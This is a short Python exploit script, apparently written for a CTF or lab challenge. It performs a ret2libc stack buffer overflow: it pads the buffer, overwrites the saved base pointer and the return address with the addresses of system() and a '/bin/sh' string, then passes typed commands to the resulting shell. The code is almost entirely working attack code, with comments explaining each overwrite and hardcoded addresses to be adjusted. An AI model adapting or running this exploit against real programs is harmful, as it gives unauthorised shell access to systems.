#!/usr/bin/python3

import sys

# Overflow the buffer (16 bytes)
# Overwrite the pointers stored on the stack from the prints (8 bytes)
# Overflow the base pointer (4 bytes)
# Write address of system to the return address (4 bytes)
# Write 4 bytes for return after system call (we don't care, segfault is fine) (4 bytes)
# Write address of /bin/sh (4 bytes)

addressOfSystem     = b"\x40\x70\xc4\xf7" # This may need changing
returnAfterSys      = b"\xe0\x96\xc3\xf7" # This can be anything
addressOfBashString = b"\xce\x40\xdb\xf7" # This may need changing

sys.stdout.buffer.write(b"A"*16 + b"Z"*8 + b"B"*4 + addressOfSystem + returnAfterSys + addressOfBashString)
print()
while True:
    command = input()
    print(command)